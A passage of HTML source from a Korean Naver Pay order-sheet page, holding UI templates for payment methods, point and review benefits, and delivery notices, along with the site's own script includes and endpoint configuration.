										{if (item.textReviewMileage.NORMAL > 0 || item.photoVideoReviewMileage.NORMAL > 0)}
											<strong class="tit">리뷰 작성 시 포인트 안내</strong>
										{/if}
										{if item.textReviewMileage.NORMAL > 0}
											<span class="detail">텍스트 리뷰 <b class="pointcolor_npay">{=commaNormalTextReviewMileage}원</b></span>
										{/if}
										{if item.photoVideoReviewMileage.NORMAL > 0}
											<span class="detail">포토/동영상 리뷰 <b class="pointcolor_npay">{=commaNormalPhotoVideoReviewMileage}원</b></span>
										{/if}
										{if (item.textReviewMileage.AFTER_USE > 0 || item.photoVideoReviewMileage.AFTER_USE > 0)}
											<strong class="tit">한달사용 리뷰 작성 시 추가 포인트 안내</strong>
										{/if}
										{if item.textReviewMileage.AFTER_USE > 0}
											<span class="detail">텍스트 리뷰 <b class="pointcolor_npay">{=commaAfterUseTextReviewMileage}원</b></span>
										{/if}
										{if item.photoVideoReviewMileage.AFTER_USE > 0}
											<span class="detail">포토/동영상 리뷰 <b class="pointcolor_npay">{=commaAfterUsePhotoVideoReviewMileage}원</b></span>
										{/if}
										{if item.subscriberReviewMileage > 0}
											<span class="detail talktalk">톡톡친구/스토어찜 고객 포인트<br> 추가 지급 <b class="pointcolor_npay">{=commaSubscriberReviewMileage}원</b></span>
										{/if}
									</div>
								</td>
							</tr>
							{/for}
							</tbody>
						</table>
					</div>
				</div>
				<button class="layer_close _click(nmp.layer.hide()) _stopDefault"><span class="blind">팝업 닫기</span></button>
			</script>
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			<script type="text/template" class="_tpl_layer_payNextGuide">
				{set skipPaymentDueDate = "2"}
				{if isEasyBooking == 'true'}
					{set skipPaymentDueDate = "1"}
				{/if}
				<dt>나중에 결제란?</dt>
				<dd>무통장입금과 같이 지금 결제하지 않고 주문 완료 후 {=skipPaymentDueDate}영업일 내에 결제할 수 있는 결제 수단입니다.
					<ul class="bullet">
						<li>결제수단 : 계좌 간편결제, 카드 간편결제</li>
					</ul>
					(상품에 따라 이용 가능한 결제 수단이 다를 수 있으니 주문 시 확인해주세요)
				</dd>
				<dd>
					<ul class="bullet">
						<li>결제가 완료되어야
							{if isEasyBooking == 'true'}
								예약이 진행되며 1일 내에 결제되지 않으면, 예약이 취소됩니다.
							{else}
								배송이 진행되며 2영업일 이내 결제되지 않으면 주문이 취소됩니다.
							{/if}
						</li>
						<li>‘나중에 결제’ 수단을 선택하실 경우 주문 후 {=skipPaymentDueDate}영업일 이내 <a href="http://order.pay.naver.com/home" class="pointcol5" target="_blank">결제 내역에서 결제</a>해주세요.</li>
					</ul>
				</dd>
				<dd>무통장입금을 원하시는 경우 ‘나중에 무통장 입금’ 결제 수단으로 주문해주세요.</dd>
			</script>
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			<script type="text/template" class="_tpl_layer_blackconsumer">
				<div class="dimmed"></div>
				<div class="ly_wrap _blackconsumerNotice" style="margin-left:-193px;">
					<div class="ly_container error_v2">
						<strong class="ly_tit">구매불가 상품 안내</strong>
						{if customerCenterTelNo != null}
							<p class="ly_desc">회원님은 해당 판매자의 상품 구매가 불가 합니다.<br>자세한 사항은 판매자에게 문의하여 주시기 바랍니다.<br><em class="point_txt">{=merchantName}({=customerCenterTelNo})</em></p>
						{else}
							<p class="ly_desc">회원님은 해당 판매자의 상품 구매가 불가 합니다.<br>자세한 사항은 상품 Q&A를 통해<br>판매자에게 문의하여 주시기 바랍니다.<br></p>
						{/if}
						<a href="#" class="btn_prev _click(nmp.front.order.order_sheet.hideNotice(_blackconsumerNotice)) _stopDefault">확인</a>
					</div>
				</div>
			</script>
			
			<script type="text/template" class="_tpl_layer_point_charge">
				<a href="{=detailLink}" class="charge_notice _pointChargeArea">{=message}<span class="ico_more"></span></a><!--N=a:ode.pointchc-->
			</script>
			
			<script type="text/template" class="_tpl_layer_hopeDeliveryFee">
				<dl>
					<dt>희망일배송 지역별 배송비</dt>
					<dd>
						{for index:text in hopeDeliveryFeeTexts}
							{=text}<br />
						{/for}
						<br />
						추가 비용은 착불 등을 통해 별도
						<br />
						지불 (판매자 확인 가능)
					</dd>
				</dl>
			</script>
			
			<script type="text/template" class="_tpl_easy_pay_card_info">
				<span class="type">{=sCardType}</span>
				<div class="card_name">
					<span class="card_no"><span class="blind">카드 뒤 4자리</span>({=sCardNo})</span>
					<p class="name"><span class="blind">카드명</span>{=sCardName}</p>
				</div>
			</script>
			
			<script type="text/template" class="_tpl_easy_pay_bank_panel">
				<li class="flick-ct flick-ct-dmm _flickPanel" style="transition-property: -webkit-transform; transition-duration: 0ms; transform: translate(0px, 0px); float: left; {if !oRegisteredEasyPayBank.isPayable} width: 5.26316%; {else} width: 6.66666666666667%;{/if} left: 0%; z-index: 10;">
					<div class="flick-wrap">
						{if oRegisteredEasyPayBank.payPartnershipItemCode != null && oRegisteredEasyPayBank.payPartnershipItemCode != ""}
						{set easyPayBankClass = (=oRegisteredEasyPayBank.payPartnershipItemCode)}
						{else}
						{set easyPayBankClass = 'bank_' + (=oRegisteredEasyPayBank.bankCode)}
						{/if}
						<div class="simplepay_select _easyPayMethod _easyPayMethodSelect {=easyPayBankClass}">
							{if oRegisteredEasyPayBank.isPayable}
							<span class="sp_simplepay button_checked"></span>
							{/if}
			
							{if oRegisteredEasyPayBank.nickName != null && oRegisteredEasyPayBank.nickName != ""}
							{set easyPayAccountName = (=oRegisteredEasyPayBank.nickName)}
							{elseif oRegisteredEasyPayBank.payPartnershipItemName != null && oRegisteredEasyPayBank.payPartnershipItemName != ""}
							{set easyPayAccountName = (=oRegisteredEasyPayBank.payPartnershipItemName)}
							{else}
							{set easyPayAccountName = '계좌번호'}
							{/if}
			
							<div name="payMeansClass" data-code="{=oRegisteredEasyPayBank.bankCode}" data-account-key="{=oRegisteredEasyPayBank.accountKey}" class="card_select bank sp_bank _payMeansClass {if !oRegisteredEasyPayBank.isPayable}disabled{/if}">
								<span class="blind">{=oRegisteredEasyPayBank.bankCode}</span>
								{if oRegisteredEasyPayBank.isPayable}
								<strong class="account_name noname">{=easyPayAccountName}</strong>
								<p class="card_number">{=oRegisteredEasyPayBank.maskedAccountNo}</p>
								{else}
								<span class="checking">점검중</span>
								<p class="disable_text">은행 시스템 점검으로 인해 해당 계좌로<br>간편결제를 이용하실 수 없습니다.</p>
								{/if}
							</div>
						</div>
					</div>
				</li>
			</script>
			
			<script type="text/template" class="_tpl_purchase_benefit">
				{set commaTotal=nmp.utility.convertNumberFormat(=TOTAL)}
				<div class="benefit_summary">
					<strong class="saving_title">구매적립<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerMileage(normal)) _stopDefault" title="?">도움말</a><!--N=a:ord.buybenefit--></strong>
					<em class="summary_num">총 <span>{=commaTotal}</span>원</em>
				</div>
				<ul class="inner_list">
					{set commaTotalPurchaseMileage=nmp.utility.convertNumberFormat(=TOTAL_PURCHASE)}
					{set commaTotalAdditionalMileage=nmp.utility.convertNumberFormat(=TOTAL_ADDITIONAL)}
					{set commaMembershipPoint=nmp.utility.convertNumberFormat(=TOTAL_MEMBERSHIP)}
					{set commaTotalChargedPoint=nmp.utility.convertNumberFormat(=TOTAL_CHARGED_POINT)}
					{set commaTotalChargedPointAdditional=nmp.utility.convertNumberFormat(=TOTAL_CHARGED_POINT_ADDITIONAL)}
					{set commaTotalAdminAdditionalPoint=nmp.utility.convertNumberFormat(=TOTAL_ADMIN_ADDITIONAL)}
			
					{if (TOTAL_PURCHASE > 0)}
					<li>
						<span class="benefit_name">기본적립</span>
						<span class="benefit_sum"><b>{=commaTotalPurchaseMileage}</b>원</span>
					</li>
					{/if}
					{if (TOTAL_ADMIN_ADDITIONAL > 0)}
					<li>
							<span class="benefit_name">상품구매 추가적립</span>
						<span class="benefit_sum"><b>{=commaTotalAdminAdditionalPoint}</b>원</span>
					</li>
					{/if}
					{if (TOTAL_SCM > 0)}
					{for item in items}
						{set commaSellerCustomerManagementMileage=nmp.utility.convertNumberFormat(=item.amount)}
						<li>
							<span class="benefit_name">{=item.key}</span>
							<span class="benefit_sum"><b>{=commaSellerCustomerManagementMileage}</b>원</span>
						</li>
					{/for}
					{/if}
					{if (TOTAL_ADDITIONAL > 0)}
					<li>
						<span class="benefit_name">파워적립</span>
						<span class="benefit_sum"><b>{=commaTotalAdditionalMileage}</b>원</span>
					</li>
					{/if}
					{if (TOTAL_INFLOW > 0)}
						{for inflowBenefit in inflowBenefits}
							{set commaInflowBenefitMileage=nmp.utility.convertNumberFormat(=inflowBenefit.mileage.amount)}
								{if !inflowBenefit.mileage.membershipImageYn}
									<li>
										<span class="benefit_name">{=inflowBenefit.key}</span>
										<span class="benefit_sum"><b>{=commaInflowBenefitMileage}</b>원</span>
									</li>
								{/if}
						{/for}
					{/if}
					{if (TOTAL_INFLOW > 0)}
						{for inflowBenefit in inflowBenefits}
							{set commaInflowBenefitMileage=nmp.utility.convertNumberFormat(=inflowBenefit.mileage.amount)}
							{if inflowBenefit.mileage.membershipImageYn}
								<li>
									<span class="benefit_name">{=inflowBenefit.key} <span class="ico_npmember type_abbr"><span class="blind">네이버플러스 멤버십</span></span></span>
									<span class="benefit_sum"><b>{=commaInflowBenefitMileage}</b>원</span>
								</li>
							{/if}
						{/for}
					{/if}
					{if (TOTAL_CHARGED_POINT > 0)}
					<li>
						<span class="benefit_name">충전포인트 결제적립</span>
						<span class="benefit_sum"><b>{=commaTotalChargedPoint}</b>원</span>
					</li>
					{/if}
					{if (TOTAL_CHARGED_POINT_ADDITIONAL > 0)}
					<li>
						<span class="benefit_name">네이버통장 추가적립</span>
						<span class="benefit_sum"><b>{=commaTotalChargedPointAdditional}</b>원</span>
					</li>
					{/if}
					{if (TOTAL_MEMBERSHIP > 0)}
					<li class="membership_item">
						<span class="benefit_name">멤버십 추가적립 <span class="ico_npmember type_abbr"><span class="blind">네이버플러스 멤버십</span></span>
							
						</span>
						<span class="benefit_sum"><b>{=commaMembershipPoint}</b>원</span>
					</li>
					{/if}
				</ul>
			</script>
			
			<script type="text/template" class="_tpl_card_benefit">
				{if (commaCardBenefitPoint > 0)}
				{set cardBenefitPoint=nmp.utility.convertNumberFormat(=commaCardBenefitPoint)}
				<div class="benefit_summary">
					<strong class="saving_title">혜택카드적립<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerCardBenefit()) _stopDefault" title="?">도움말</a></strong>
					<em class="summary_num">최대 <span>{=cardBenefitPoint}</span>원</em>
				</div>
				{/if}
			</script>
			
			
			<script type="text/template" class="_tpl_review_benefit">
				{if (TOTAL > 0)}
					{set commaMaxReviewMilease=nmp.utility.convertNumberFormat(=MAX_REVIEW_MILEASE)}
					<div class="benefit_summary">
						<strong class="saving_title">리뷰적립<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerReviewMileage()) _stopDefault" title="?">도움말</a><!--N=a:ord.reviewbenefit--></strong>
						<em class="summary_num">최대 <span>{=commaMaxReviewMilease}</span>원</em>
					</div>
				{/if}
			</script>
			
			<script type="text/template" class="_tpl_review_benefit_guide_c1">
				<div class="desc_text">
					<p>동일 상품의 상품리뷰 적립은 1회로 제한됩니다.</p>
				</div>
			</script>
			
			<script type="text/template" class="_tpl_review_benefit_guide_c2">
				<div class="desc_text">
					<p>동일 상품의 상품리뷰/한달사용리뷰 적립은 각각 1회로 제한됩니다.</p>
				</div>
			</script>
			
			<script type="text/template" class="_tpl_register_account_benefit">
				{set commaBankEventMileage=nmp.utility.convertNumberFormat(=BANK_EVENT)}
				<strong class="saving_title">등록적립<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerPayEvent(ACCOUNT,REGISTER,{=BANK_EVENT})) _stopDefault" title="?">도움말</a></strong>
				<ul class="inner_list">
					<li>
						<span class="benefit_name">첫 계좌 등록 시</span>
						<span class="benefit_sum"><b>{=commaBankEventMileage}</b>원</span>
					</li>
				</ul>
			</script>
			
			
			
			
			<script type="text/template" class="_tpl_layer_payEvent">
				<dt><span class="sp_npay">네이버 페이</span> 간편결제 {=payMethod} 첫 {=action} 혜택</dt>
				<dd>
					<p class="info_txt">네이버페이 <strong>간편결제 {=payMethod} 첫 {=action}</strong>시 현금처럼 사용가능한 네이버페이 포인트 <strong>{=amount}원</strong>을 즉시 지급 해드립니다.</p>
					<p class="info_txt">{=action}완료 이후 네이버페이포인트 지급내역 바로 확인하실 수 있습니다.</p>
					<a href="http://event2.pay.naver.com/event/benefit/list{if action == '등록'}#FIRST_REGISTER{else}#FIRST_USE{/if}" class="btn_more" target="_blank">자세히보기</a>
				</dd>
			</script>
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			</div>
			
			<div class="_dimmedLayerSimplePayMethodAutoChoice" style="display:none">
				<div class="dimmed"></div>
				<div class="ly_wrap _simplePayMethodAutoChoice" style="margin-left:-240px;">
					<div class="ly_container type_nopayment">
						<strong class="ly_nopayment_sub_title">남은 결제금액이 있어<br>결제수단이 추가 선택됩니다.</strong>
						<a href="#" class="btn_prev _click(nmp.front.order.order_sheet.hideDimmedLayerSimplePayMethodAutoChoice()) _stopDefault">확인</a>
					</div>
				</div>
			</div>
			
			<div class="ly_type2 _layer_refund_account_guide" style="left: -30px; width: 320px; margin-top: 3px;margin-left: -16px; display:none">
				<p class="information">
					환불계좌 출금 정책 변경으로 인해<br><em class="enhanced">신규 환불계좌 선택이 필요합니다.</em>
				</p>
				<a href="#" class="clse _click(nmp.layer.hide()) _stopDefault clse _clse_tab"><span class="blind">닫기</span></a>
			</div>
			
			<div class="ly_type2 _coolBagDepositTooltip" style="display: none; width:320px">
				<dl class="ly_cont14">
					<dt>알비백 보증금 안내</dt>
					<dd>알비백은 SSG 새벽배송에 사용되는 보냉 가방으로 새벽배송 시 신선도 유지를 위해 주문하신 상품을 배송기사님께서 알비백에 담아드립니다.</dd>
					<dd>
						<ul>
							<li>
								네이버 장보기의 SSG 새벽배송 ‘첫 주문’ 은 알비백을 무료로 지급해 드립니다. <span class="text_small">(네이버ID 기준)</span>
								<ul class="sub_list">
									<li><em class="point">· 다음 새벽배송 주문부터 지급받은 알비백을 문 앞에 꼭 놓아 주세요.</em></li>
								</ul>
							</li>
							<li>
								두번째 주문부터 ‘알비백 보증금’ 3,000원이 함께 결제됩니다.
								<ul class="sub_list">
									<li>· 보증금은 회수용 알비백이 지급될 경우를 대비해 미리 결제해두는 금액입니다.</li>
									<li><em class="point">· 알비백을 문 앞에 두셨다면 보증금은 배송완료 시 결제하신 수단으로 환불해 드립니다.</em></li>
									<li>· 문 앞에 알비백이 없다면 신선한 배송을 위해 회수용 알비백에 담아 드립니다.
			
									</li>
								</ul>
							</li>
							<li>
								보유하신 회수용 알비백은 꼭 반납해 주세요!
								<ul class="sub_list">
									<li>· 다음 새벽배송 주문 시 회수용 알비백을 함께 문 앞에 두면, <em class="point">배송기사님이 회수 후 네이버페이 충전포인트로 돌려 드립니다.</em></li>
									<li>· 회수용 알비백을 2개 이상 보유 시 다음 주문에 결제되는 보증금이 인상됩니다.</li>
								</ul>
							</li>
						</ul>
					</dd>
				</dl>
				<a href="#" class="clse _click(nmp.front.order.order_sheet.toggleDepositTooltip(coolBagDeposit)) _stopDefault"><span class="blind">닫기</span></a>
			</div>
			
			<a href="#" target="naverPayAuth" style="display:none;" class="_naverPayAuthPopup _click(nmp.front.order.order_sheet.openNaverPayAuthPopup())"></a>              </div>
					<!-- //content -->
				
				<!-- //container -->   
			
				<!-- footer -->
				<!-- footer -->
					
				<!-- //footer -->
				
				<!-- //footer --> 
				
				
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/jindo.all.js?ts=1&amp;1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.base.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.variables.js?ts=1&amp;1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.utility.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/nmp/nmp.layer.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.event_delegator.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common/nmp.message.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/nmp/nmp.window.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/DateCoreAPI_Lite.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Component.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.UIComponent.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.HTMLComponent.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Timer.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.WatchInput.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.DefaultTextValue.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.LayerManager.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.LayerPosition.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Effect.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.LayerEffect.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Transition.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Calendar.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.DatePicker.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.PeriodDisplay.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.DateRangePicker.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.WeekPicker.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.MonthPicker.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.MultiDatePicker.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Pagination.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.TabControl.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.LazyLoading.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.RolloverArea.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.RolloverClick.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.SelectBox.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.Rolling.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.CircularRolling.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.NumericStepper.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/jindo.FileUploader.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.Base.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.Grid.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.DataRequester.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.ExtendGrid.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.CategorySelectorBase.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.CategorySelectorForSelectBox.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.FormHelper.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.AffiliateLayerLoader.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/component/nmp.component.RollingList.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/c/commonjs/static/js/common/lcslog-0.8.4.js" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/c/commonjs/mobile_static/js/jindo/mobile_component/jindo.m.js" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/c/commonjs/mobile_static/js/jindo_2_11_0/mobile_component/jindo.m.component.merged.js" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/common_timeline/jindo_component_1_14_0/jindo-component.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/formatter.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/ui.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/popup.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/fieldMergeUtil.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/order_sheet.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/cstatic/js/component/nmp.component.Calculator.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/cstatic/js/component/nmp.component.OrderProductCalculator.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/order_sheet/storage.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/order_sheet/integration_cart.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/tveta/libs/ssp/polyfill/js/ssp.polyfill.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript" src="http://ssl.pstatic.net/static.pay/o/202203/10_210313_1646913793/order_customer/static/js/service/front/order/order_glad.js?1646914882576" charset="utf-8"></script>
			<script type="text/javascript">
			   lcs_do();
			nmp.registerModule(nmp.layer, {"bKeyActionUse" : true});
			nmp.registerModule(nmp.front.order.ui);
			nmp.registerModule(nmp.front.order);
			nmp.registerModule(nmp.front.order.fieldMergeUtil);
			nmp.registerModule(nmp.front.order.popup, {
			"urls" : 	{
						"benefit.front.order.popup.refundmentAccountBook" : "http://pay.naver.com/mypage/refundmentAccountList",
						"front.order.popup.addressBook" : "http://pay.naver.com/mypage/deliveryPlaceList",
						"front.order.popup.addressBook.new" : "http://pay.naver.com/shipping/popup/list",
					"":""
				}
			,
			"isDeliveryAddressAgreed" : true,
			"" : ""
			});
			
			nmp.registerModule(nmp.front.order.order_sheet,{
			"urls" : 	{
						"user.front.myPage.update" : "http://pay.naver.com/mypage/update",
						"user.front.myPage.simple.update" : "http://pay.naver.com/mypage/simpleUpdatePopup",
						"user.front.email.update" : "http://new-m.pay.naver.com/member/user-info/email",
						"user.front.cellphone.update" : "http://new-m.pay.naver.com/member/user-info/mobile-number",
						"mileage.popup.agree" : "http://mileage.naver.com/customer/popup/member/agree?returnUrl=http://order.pay.naver.com/orderSheetPopup/agreeCallback",
						"naver.don.pay.popup" : "http://bill.naver.com/pay/payment.nhn?CHNL=NV&RSVSEQ=",
						"naver.don.agree.popup" : "http://pay.naver.com/naverCashAgree",
						"order.pay.progress" : "http://order.pay.naver.com/orderSheetPopup/payProgress",
						"user.front.host" : "pay.naver.com",
						"pay.password.authentification.popup.url" : "http://new.pay.naver.com/auth/check",
						"pay.ars.authentification.popup.url" : "http://nid.naver.com/iasystem/pop.nhn?todo=pers_popup_ars&target=persAuth_popup",
						"pay.authentification.return.url" : "http://order.pay.naver.com/orderSheetPopup/naverPayAuthResult?d=",
						"pay.password.init.popup.url" : "http://nid.naver.com/user2/naverPay.nhn?m=viewAuthNaverPayPasswd",
						"pay.limit.conf.url" : "http://new-m.pay.naver.com/settings/payment-security/pay",
						"member.cardpoint.amount.pc.url" : "http://pay.naver.com/userpoint/api/cardpoint/totalAmount",
						"member.cardpoint.callback.pc.url" : "http://pay.naver.com/userpoint/cardpoint/info?displayType=PC&callback=",
						"point.charge.pc.url" : "http://pay.naver.com/userpoint/api/chargepoint/orderinfo?type=PC",
						"charge.pay.url" : "http://pay.naver.com/npoint/pay/charge.naver?CHNL=NV&RURL=",
						"order.ordersheet.url" : "http://order.pay.naver.com/orderSheet/",
						"pc.easy.card.register.url" : "http://dbill.naver.com/build/index.html#/card-registration",
						"pc.easy.bank.register.url" : "http://pay.naver.com/send/p/account/selectBank",
						"order.ordersheet.registration.creditCard.return.url" : "http://order.pay.naver.com/orderSheetPopup/callback/registration/creditCard/success",
						"order.ordersheet.registration.creditCard.cancel.url" : "http://order.pay.naver.com/orderSheetPopup/callback/registration/creditCard/fail",
						"order.ordersheet.registration.bank.return.url" : "http://order.pay.naver.com/orderSheetPopup/callback/registration/bank/success",
						"order.ordersheet.registration.bank.cancel.url" : "http://order.pay.naver.com/orderSheetPopup/callback/registration/bank/fail",
						"member.auth.popup.url" : "http://order.pay.naver.com/memberAuth/popup",
						"adult.authentication.popup.url" : "http://nid.naver.com/iasystem/pop.nhn",
